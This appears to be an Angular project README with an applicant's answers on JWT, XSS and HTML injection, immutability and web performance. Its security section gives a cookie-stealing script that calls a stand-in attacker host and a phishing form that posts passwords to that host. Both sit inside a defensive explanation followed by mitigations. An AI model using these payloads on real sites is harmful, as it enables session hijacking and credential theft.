This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 17.3.6.

## How to setup

Run `npm install` and everything is fine.


## Run the app

Run `ng serve` for a dev server. Navigate to `http://localhost:4200/`. The application will automatically reload if you change any of the source files.

## Unit tests

The core functionality and the behaviors are well tested.

# Answers to the questions

## Question 1: Why is JWT is (or isn't) safe to use this? 

JWT can be safe or unsafe depends on the way we use it. We should not send sensitive information in JWT unless it's encrypted.

JWT is a way of securely transmitting data between 2 parties as JSON object, because it's signed and we can make sure that the senders are who they say they are. It's stateless and self contained. Most common scenario for JWT is to authorize users and allow access routes, services etc. Server can identify who the user is just by decoding the JWT token, which prevents the overhead of reading the user information from database each time a request comes from the client.

Why it is safe?
The only security we get with JWT is the ability to verify whether the token is tampered or not and modified any data in it. That's the only safety we get. If the token is tampered the signature verification fails and server can refuse the request in that case. So we can confirm the senders are the one who they say they are.

It's always safe to keep the JWT in cookie, because server can use HttpsOnly to prevent JavaScript accessing this particular cookie, which prevent XXS attacks. But on the downside the client cannot read the JWT token which sometimes will be needed in the client.

We can set an expiry to the JWT, which server can check and reject the request. Then client has to reauthenticate probably. But sometimes the server can automatically re-issue a new token by refreshing it.

The payload in the JWT token is exposed to other parties, even though it's not possible to change it. This means we must not add sensitive information to the token. We must only keep non-sensitive information such as user claims, user roles, user email, name and etc. Because any man-in-the middle who gets to intercept the data packets going through the internet can read the contents of the JWT easily.

## Question 2: Messages sent from one user to another, can contain HTML, write two attack vectors and mitigation.

### Attack vector 1: Cross Site Scripting (XSS)
This is when an attacker trying to execute a script in victim’s browser. And steal sensitive information stored in the browser like user session token and can lead to session hijacking. XSS attacks can take place anywhere a web app outputs/renders a user input in the web app without validating or encoding it.

Here is a simple example, assume that the bad player send a message that contains something like below:

```html
Hellow..
<script>
  document.location = "http://attackers-website.com/steal.php?cookie=" + document.cookie;
</script>
```

When the victim receives this message and the application renders it in the victim's page, the script will be immediately executed and redirect the victim to the specified website with the cookie in the query parameter. And the attacker can use this cookie to hijack the victim's session.

### Attack vector 1 mitigation:
We can do multiple things to mitigate the risk of session hijacking. These are just few steps to secure, but always we have to follow security practices and audits.

#### Step 1
If you want to render a user's message in another user's browser, use the safe api in JS, which is element.textContent than element.innerHTML. This way the browser does not parse it as HTML.

#### Step 2
Make sure to store the identity/session related token in HttpOnly cookies. These type of cookies cannot be accesses by the JavaScript and it will be sent with the requests only to the origin domain and nowhere else.

#### Step 3
Content Security Policy (CSP)
This is also an added layer of security to prevent XSS. These are special headers are returned from the server that kind of whitelists the domains that the browser trusts when running the application. The browser should be compatible with CSP which is the case in almost every browser now. 
Now the browser will only execute scripts from those allowed domains, all other scripts including inline scripts like in the above mentioned example will be blocked, and event-handling HTML attributes (onclick, onerror) will also be blocked by the browser.

Alternatively, the <meta> element can also be used in the root html file to configure CSP, for example:
```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';" />
```

#### Step 4
Implement proper input sanitization, we must sanitize all user submitted HTML content and remove or disable any executable scripts. This can be done by removing elements like <script>, <img>, and all known event handlers such as "onerror", "onload", "onclick", or escaping them so they are displayed as plain text when rendered.
As for the above example, the sanitisation might include converting the above element to HTML character entities like below:

```html
  Hello..
  &lt;script&gt;
    document.location = &quot;http://attackers-website.com/steal.php?cookie=&quot; + document.cookie;
  &lt;/script&gt;
```

### Attack vector 2: Html Injection
This is similar to XSS, but malicious html elements are sent in the message instead of scripts, that can alter the page to create forms to phish passwords or any other sensitive information of the user, or include malicious links, check the below example:

```html
<p>Please update your password right now to prevent getting backed:</p>
<form action="http://attackers-website.com" method="POST">
    Current Password: <input type="password" name="password"/>
    New Password: <input type="password" name="password"/>
    <input type="submit" value="Update"/>
</form>
```

This prompts user to enter the current password, and when clicked Update button, the password it will be sent to attacker's website.

### Attack vector 2 mitigation:

#### Step 1: Use the safe api
Use the safe api which is element.textContent than element.innerHTML for showing the user input in the browser.
Implement input validations:
Validate if the user input is in the expected shape and meets certain criteria.

#### Step 2: Sanitize user input: 
Done by removing or replacing characters that have special meaning in HTML

#### Step 3: Implement output encoding: 
In addition to above, we can encode user input by converting the special characters to HTML char entities.

## Question 3: Explain the difference between mutable and immutable objects. Examples, pros and cons, how to achieve immutability.

### Difference between immutable and mutable objects.
Mutable objects are those state or value can be changed after created. 
Immutable objects cannot be changed once they are created. Only new objects can be created with new memory reference.

### Examples of immutable objects in JS
strings, numbers, booleans immutable in JavaScript

### Pros and cons
Pros: 
- Immutable objects are predictable as their state never change. Avoids unintended side effects when it flows through the app and shared among many components. 
- Concurrent safe: Safe to use in a concurrent environment as they don’t need locks and no fear of race conditions. Easy for atomic operations.
- Undo/Redo: Easy to maintain a history of states with immutable objects, an example if React dev tool's time travel feature, that we can see all changes to an object as history.
- Efficient change detection in UI frameworks: Immutable objects are crucial in front end applications where the DOM is reconciliated, it's easy to decide on re-rendering if it's a new reference, otherwise we have to deep compare objects. 

Cons:
- Memory overhead: Can lead to increased memory because every change require creating new objects.
- Garbage collector works heavy: Frequent creation of new objects increases pressure on the garbage collector, which can lead to performance issues.
- Performance: May cause performance overhead due to the need for creating new objects instead of modifying existing ones.
- Code complexity and readability

### How to implement immutability
- We can use Object.freeze method to create a mutable object natively in JS. Objects created by this prevents adding new properties, existing properties from being removed. However, it only works shallowly.

- Use immutable.js to create many types of immutable data structures. 

- In JS we have operations that do not modify the original data but instead return new data. Ex: map(), filter(), and reduce() are immutable operations.

## Question 4: If you would have to speed up the loading of a web-application, how would you do that?

### Optimize and lazy load modules
Splitting the web application into smaller modules can drastically reduce the initial load time. When modules are lazy loaded, it only downloads the code necessary for the initial view, loading other features on demand.

### Optimize assets by compressing them
Heavy high resolution images, scripts and css styles can really slowdown the application. Compress them and minify them. Use WebP images which are smaller in size but high quality.

### SSR - Server side rendering
This will load the web app very faster by quickly displaying a fully rendered page to the user, which is also effective for SEO and the performance of the first DOM paint.

### Lazy load images and Iframes
Render the view first and then load expensive images.

### Prioritize visible content and limit https request on landing page
Only fetch absolutely required data to show the visible content. Then we can lazy load any additional data. In this way the user get to see the page soon.

### Implement caching and CDN
Consider caching the content in the browser that are needed for the landing page if they are not rapidly changing. Use CDN can drastically improve performance, it will cache cache static assets in multiple locations and deliver the content to the user from the closest location. 

## Question 4: Choices between own hardware and company supplied OS vs Standard hardware with own choice of software.

I like to choose my own hardware with own software :D But anyway I believe in a company like Zivver, which specializes in email encryption, security is likely a top priority. Therefore I guess the employees are given machines with special OS, and that maybe crucial to ensure all security protocols and stands are applied. 